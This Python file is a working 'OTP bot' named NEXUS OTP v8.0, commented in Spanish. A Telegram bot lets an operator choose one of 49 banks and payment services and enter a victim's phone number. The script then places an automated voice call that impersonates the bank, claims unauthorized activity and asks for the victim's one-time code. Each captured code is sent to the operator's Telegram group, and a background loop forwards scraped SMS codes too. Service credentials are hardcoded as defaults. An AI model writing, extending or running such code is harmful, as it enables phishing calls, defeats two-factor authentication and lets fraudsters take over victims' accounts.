import os
import asyncio
import logging
import threading
import requests
import time
from datetime import datetime
from flask import Flask, request, jsonify
from dotenv import load_dotenv
from signalwire.rest import Client as signalwire_client

# Telegram imports
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters

# Módulos locales (Asegúrate de que scraper.py y otp_filter.py estén en la misma carpeta)
try:
    from scraper import create_scraper
    from otp_filter import otp_filter
    from utils import format_otp_message
except ImportError:
    pass

# Cargar configuración
load_dotenv()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# --- CONFIGURACIÓN DE VARIABLES ---
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
GROUP_ID = os.getenv('TELEGRAM_GROUP_ID')
SW_PROJECT = os.getenv('SIGNALWIRE_PROJECT', '4c37b4d6-dc54-45f4-bb1e-3e56e16ab9b5')
SW_TOKEN = os.getenv('SIGNALWIRE_TOKEN', 'PT81230d7283847f875cb9afddb579e62135baaee2d045ace1')
SW_SPACE = os.getenv('SIGNALWIRE_SPACE', 'space-otp.signalwire.com')
SW_NUMBER = os.getenv('SIGNALWIRE_NUMBER', '+18778273701')
APP_URL = os.getenv('APP_URL') # Tu URL de Heroku: https://app-name.herokuapp.com

sw_client = signalwire_client(SW_PROJECT, SW_TOKEN, signalwire_space_url=SW_SPACE)

# --- DICCIONARIO MAESTRO (49 MÓDULOS) ---
MODULOS = {
   "chase": {"name": "JPMorgan Chase", "msg_en": "the 6-digit verification code sent to your device", "digits": 6},
    "bofa": {"name": "Bank of America", "msg_en": "your 6-digit SafePass verification code", "digits": 6},
    "citi": {"name": "Citigroup", "msg_en": "the one-time security code for this alert", "digits": 6},
    "wells": {"name": "Wells Fargo", "msg_en": "the temporary access code sent via SMS", "digits": 6},
    "gsachs": {"name": "Goldman Sachs", "msg_en": "your identity verification code", "digits": 6},
    "mstanley": {"name": "Morgan Stanley", "msg_en": "the security code for your login request", "digits": 6},
    "usbank": {"name": "U.S. Bank", "msg_en": "the 6-digit code to confirm your identity", "digits": 6},
    "pnc": {"name": "PNC Financial", "msg_en": "the verification code sent to your phone", "digits": 6},
    "truist": {"name": "Truist Financial", "msg_en": "your security verification digits", "digits": 6},
    "capone": {"name": "Capital One", "msg_en": "the 6-digit code to authorize this security update", "digits": 6},
    "tdbank": {"name": "TD Bank", "msg_en": "your security verification code", "digits": 6},
    "bnymellon": {"name": "BNY Mellon", "msg_en": "the code to authorize your access", "digits": 6},
    "statestreet": {"name": "State Street", "msg_en": "the identity verification code", "digits": 6},
    "amex": {"name": "American Express", "msg_en": "the security code sent to your mobile device", "digits": 6},
    "citizens": {"name": "Citizens Bank", "msg_en": "your one-time security code", "digits": 6},
    "firstcit": {"name": "First Citizens Bank", "msg_en": "the 6-digit verification code", "digits": 6},
    "fifththird": {"name": "Fifth Third Bank", "msg_en": "the security alert verification code", "digits": 6},
    "keybank": {"name": "KeyBank", "msg_en": "the code sent to authorize your login", "digits": 6},
    "huntington": {"name": "Huntington Bank", "msg_en": "your 6-digit verification code", "digits": 6},
    "mtbank": {"name": "M&T Bank", "msg_en": "the security digits for this session", "digits": 6},
    "regions": {"name": "Regions Financial", "msg_en": "your verification code", "digits": 6},
    "ally": {"name": "Ally Financial", "msg_en": "the 6-digit security code", "digits": 6},
    "discover": {"name": "Discover Bank", "msg_en": "your verification digits for this alert", "digits": 6},
    "bmo": {"name": "BMO Harris Bank", "msg_en": "the code sent to your device", "digits": 6},
    "santander": {"name": "Santander Bank USA", "msg_en": "the security code to verify your identity", "digits": 6},
    "schwab": {"name": "Charles Schwab", "msg_en": "the verification code for your account", "digits": 6},
    "ntrust": {"name": "Northern Trust", "msg_en": "your security access code", "digits": 6},
    "synchrony": {"name": "Synchrony Bank", "msg_en": "the code sent for verification", "digits": 6},
    "comerica": {"name": "Comerica", "msg_en": "the 6-digit verification code", "digits": 6},
    "firsthor": {"name": "First Horizon", "msg_en": "the security digits sent to you", "digits": 6},
    "svb": {"name": "Silicon Valley Bank", "msg_en": "the identity verification code", "digits": 6},
    "signature": {"name": "Signature Bank", "msg_en": "your one-time security code", "digits": 6},
    "chime": {"name": "Chime", "msg_en": "the 6-digit code for your security alert", "digits": 6},
    "varo": {"name": "Varo Bank", "msg_en": "your login verification code", "digits": 6},
    "sofi": {"name": "SoFi", "msg_en": "the verification code for your account", "digits": 6},
    "navyfed": {"name": "Navy Federal", "msg_en": "the 6-digit verification code for this request", "digits": 6},
    
    # SERVICIOS ADICIONALES
    "paypal": {"name": "PayPal", "msg_es": "el código de seguridad de PayPal", "msg_en": "your PayPal security code", "digits": 6},
    "facebook": {"name": "Facebook", "msg_es": "el código de recuperación de Facebook", "msg_en": "your Facebook code", "digits": 6},
    "amazon": {"name": "Amazon", "msg_es": "el código de aprobación de Amazon", "msg_en": "your Amazon approval code", "digits": 6},
    "applepay": {"name": "Apple Pay", "msg_es": "el código de Apple Pay", "msg_en": "your Apple Pay code", "digits": 6},
    "coinbase": {"name": "Coinbase", "msg_es": "el código de Coinbase", "msg_en": "your Coinbase code", "digits": 6},
    "crypto": {"name": "Crypto.com", "msg_es": "el código de transferencia", "msg_en": "your transfer code", "digits": 6},
    "microsoft": {"name": "Microsoft", "msg_es": "el código de Microsoft", "msg_en": "your Microsoft code", "digits": 6},
    "venmo": {"name": "Venmo", "msg_es": "el código de Venmo", "msg_en": "your Venmo code", "digits": 6},
    "cashapp": {"name": "CashApp", "msg_es": "su código de inicio de sesión", "msg_en": "your login code", "digits": 6},
    "carrier": {"name": "Operadora", "msg_es": "el código enviado por su operadora", "msg_en": "the code sent by your carrier", "digits": 6},
    "email": {"name": "Email", "msg_es": "el código enviado a su correo", "msg_en": "the code sent to your email", "digits": 6},
}

# --- WEBHOOKS ---
@app.route('/')
def index(): return "🚀 OTP System Online", 200

@app.route('/otp-recibido', methods=['POST'])
def otp_recibido():
    digits = request.form.get('Digits')
    target = request.form.get('To')
    mod_key = request.args.get('mod')
    mod = MODULOS.get(mod_key, {"name": "Unknown", "digits": 6})
    
    is_us = target.startswith("+1")
    lang, voice = ("en-US", "Polly.Joanna") if is_us else ("es-MX", "alice")

    if digits and len(digits) >= int(mod['digits']):
        msg = f"✅ <b>¡CÓDIGO CAPTURADO!</b>\n🏦 Mod: <code>{mod['name']}</code>\n📱 Target: <code>{target}</code>\n🔑 OTP: <code>{digits}</code>"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      json={"chat_id": GROUP_ID, "text": msg, "parse_mode": "HTML"})
        
        thanks = "Thank you. Your account is secure." if is_us else "Gracias, verificado correctamente."
        return f"<Response><Say language='{lang}' voice='{voice}'>{thanks}</Say><Hangup/></Response>"
    
    return "<Response><Redirect/></Response>"

# --- BOT HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = []
    keys = list(MODULOS.keys())
    for i in range(0, len(keys), 2):
        row = [InlineKeyboardButton(MODULOS[keys[i]]["name"], callback_data=f"sel_{keys[i]}")]
        if i+1 < len(keys): row.append(InlineKeyboardButton(MODULOS[keys[i+1]]["name"], callback_data=f"sel_{keys[i+1]}"))
        keyboard.append(row)
    await update.message.reply_text("🏦 <b>NEXUS OTP v8.0</b>\nSelecciona módulo:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    mod_key = query.data.replace("sel_", "")
    context.user_data['active_mod'] = mod_key
    await query.message.reply_text(f"🎯 <b>{MODULOS[mod_key]['name']}</b> activo.\nEnvía el número (+1...):", parse_mode="HTML")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = update.message.text
    mod_key = context.user_data.get('active_mod')
    
    if not mod_key or not target.startswith('+'):
        await update.message.reply_text("❌ Error: Selecciona módulo o envía número válido.")
        return

    mod = MODULOS[mod_key]
    url_final = f"{APP_URL}/otp-recibido?mod={mod_key}"
    is_us = target.startswith("+1")
    lang, voice = ("en-US", "Polly.Joanna") if is_us else ("es-MX", "alice")
    
    intro = f"Security call from {mod['name']}. Unauthorized activity detected." if is_us else f"Alerta de seguridad de {mod['name']}."
    instr = f"To block this, enter {mod['msg_en']}." if is_us else f"Ingrese {mod['msg_es']}."

    twiml = f"<Response><Say language='{lang}' voice='{voice}'>{intro}</Say><Gather action='{url_final}' numDigits='{mod['digits']}' timeout='20' method='POST'><Say language='{lang}' voice='{voice}'>{instr}</Say></Gather><Hangup/></Response>"
    
    try:
        sw_client.calls.create(from_=SW_NUMBER, to=target, twiml=twiml)
        await update.message.reply_text(f"🚀 Llamando a <code>{target}</code>...", parse_mode="HTML")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# --- MONITOR SMS IVASMS ---
def monitor_loop():
    email = os.getenv('IVASMS_EMAIL')
    password = os.getenv('IVASMS_PASSWORD')
    if not email: return
    
    scraper = create_scraper(email, password)
    while True:
        try:
            msgs = scraper.fetch_messages()
            new = otp_filter.filter_new_otps(msgs)
            for m in new:
                formatted = format_otp_message(m)
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                              json={"chat_id": GROUP_ID, "text": f"🌐 <b>SMS CAPTURADO</b>\n{formatted}", "parse_mode": "HTML"})
            time.sleep(60)
        except Exception as e:
            logger.error(f"Error Scraper: {e}")
            time.sleep(30)

# --- MAIN ---
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    
    # Iniciar Monitor SMS
    threading.Thread(target=monitor_loop, daemon=True).start()
    
    # Iniciar Telegram
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(callback_handler, pattern="^sel_"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    # Hilo para Telegram polling
    threading.Thread(target=application.run_polling, daemon=True).start()
    
    # Flask en hilo principal para Heroku
    print(f"🚀 Servidor en puerto {port}")
    app.run(host='0.0.0.0', port=port)
